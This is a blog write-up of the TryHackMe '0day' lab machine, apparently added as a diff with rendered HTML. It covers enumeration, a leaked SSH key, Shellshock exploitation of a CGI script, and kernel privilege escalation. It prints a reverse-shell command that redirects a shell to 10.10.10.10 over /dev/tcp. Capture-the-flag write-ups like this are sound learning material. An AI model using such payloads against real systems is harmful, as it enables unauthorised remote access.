@@ -1,0 +1,110 @@
+I"�<p><img src="/assets/img/thm-machines/0day-main.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Introduction</span></strong></p>
+
+<hr />
+
+<p>Hey All, Hope you all are safe and doing well. Today I’m gonna do 0day machine by Ryan Montgomery on TryHackMe.It’s really good machine on ShellShock Vulnerability which is available in cgi-bin directory with test.cgi file name and the Privilage Escalation is also awesome because of the old kernel version.</p>
+
+<p>So what is exactly ShellShock Vulnerability?</p>
+
+<p>As per NetSparker, Shellshock is a security bug causing Bash to execute commands from environment variables unintentionally. In other words if exploited the vulnerability allows the attacker to remotely issue commands on the server, also known as remote code execution.
+Since the environment variables are not sanitized properly by Bash before being executed, the attacker can send commands to the server through HTTP requests and get them executed by the web server operating system.
+The ShellShock Vulnerability, discovered by Stephane Chazelas was assigned the CVE identifier CVE-2014-6271.</p>
+
+<p>Now let’s go for practical to understand and hack this machine.</p>
+
+<p><span style="color:#ff5555">This blog is meant for educational purposes only.</span></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Port &amp; Service Enumeration</span></strong></p>
+
+<hr />
+
+<p>First starting with Nmap, I found two open ports that is Port 22 and Port 80. Here Port 22 is running OpenSSH 6.6.1p1 service and Port 80 is running Apache - 2.4.7 service on Ubuntu Operating System.</p>
+
+<h2><img src="/assets/img/thm-machines/0day-nmap.png" alt="Desktop View" /></h2>
+
+<p><strong><span style="color:#ff5555">Web Enumeration</span></strong></p>
+
+<hr />
+
+<p>For further enumeration, I moved to Port 80 to check which kind of web application is running.</p>
+
+<p><img src="/assets/img/thm-machines/0day-website.png" alt="Desktop View" /></p>
+
+<p>So the web application was static. Lets run Dirsearch with common.txt to discover more content/directories of this web application.
+On other hand I started Nikto on this web application to identify common vulnerabilities.</p>
+
+<p>The Dirsearch gave me below result which contains a lot of sensitive directories.</p>
+
+<p><img src="/assets/img/thm-machines/0day-dirsearch.png" alt="Desktop View" /></p>
+
+<p>I started visiting one by one to enumerate and to find something fruitful.</p>
+
+<p>In <strong>/admin</strong> directory, I got nothing and it was totally blank page so I moved towards <strong>/backup</strong> directory and it gave me Private SSH key.</p>
+
+<p><img src="/assets/img/thm-machines/0day-ssh-key.png" alt="Desktop View" /></p>
+
+<p>Next, I saved that key and tried to login into server with different usernames such as root, admin, ryan etc but none them worked. The SSH key was asking password to login and I was doubting on this SSH key as it can be rabbit hole.</p>
+
+<p><img src="/assets/img/thm-machines/0day-ssh-error.png" alt="Desktop View" /></p>
+
+<p>At last I moved further to enumerate other directories of web application.</p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Initial Shell</span></strong></p>
+
+<hr />
+
+<p>But before that I checked Nikto’s result and it gave me a lot of hints.</p>
+
+<p><img src="/assets/img/thm-machines/0day-nikto.png" alt="Desktop View" /></p>
+
+<p>In above screenshot you can see Nikto gave one uncommon header which is actually a CVE id of ShellShock Vulnerability and also it gave /cgi-bin/test.cgi file.
+For exploitation, I googled CVE id and checked one Github page there I got Oneliner to test and confirm the ShellShock Vulnerability.</p>
+
+<p><img src="/assets/img/thm-machines/0day-github.png" alt="Desktop View" /></p>
+
+<p>After trying above Oneliner, I confirmed the ShellShock Vulnerability and continued to get reverse shell of server.</p>
+
+<p><img src="/assets/img/thm-machines/0day-oneliner.png" alt="Desktop View" /></p>
+
+<p>After using Onliner with <strong>sh&gt;&amp;/dev/tcp/10.10.10.10/1337 0&gt;&amp;1</strong> command, I got initial shell. Here we are redirecting the output of bash on 10.10.10.10 with Port 1337 using /dev/tcp connection.</p>
+
+<p><img src="/assets/img/thm-machines/0day-reverse-shell.png" alt="Desktop View" /></p>
+
+<p>Now it’s time to upgrade our shell and start enumeration to get higher privileged user.</p>
+
+<p>I used python tty and set PATH environment to upgrade my shell.</p>
+
+<p>After going to <strong>/home</strong> directory I got <strong>ryan</strong> user and also I was able to read his flag as the read permission was given.</p>
+
+<p><img src="/assets/img/thm-machines/0day-user-flag.png" alt="Desktop View" /></p>
+
+<hr />
+
+<p><strong><span style="color:#ff5555">Privilege Escalation: Root</span></strong></p>
+
+<hr />
+
+<p>After running <strong>LinPeas.sh</strong> for Privilege Escalation, I got vulnerable Linux Kernel version.</p>
+
+<p><img src="/assets/img/thm-machines/0day-linpeas.png" alt="Desktop View" /></p>
+
+<p>Here SearchSploit helped me to get the exploit.</p>
+
+<p><img src="/assets/img/thm-machines/0day-searchsploit.png" alt="Desktop View" /></p>
+
+<p>After running the exploit, I got the root!!!</p>
+
+<p><img src="/assets/img/thm-machines/0day-root-flag.png" alt="Desktop View" /></p>
+
+<p>If you want detailed explanation about this Privilage Escalation vulnerability then go <a href="https://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/">here</a></p>
+
+<p><span style="color:#ff5555"><strong>Thanks for reading this writeup and all suggestions are welcome.</strong></span></p>
+:ET
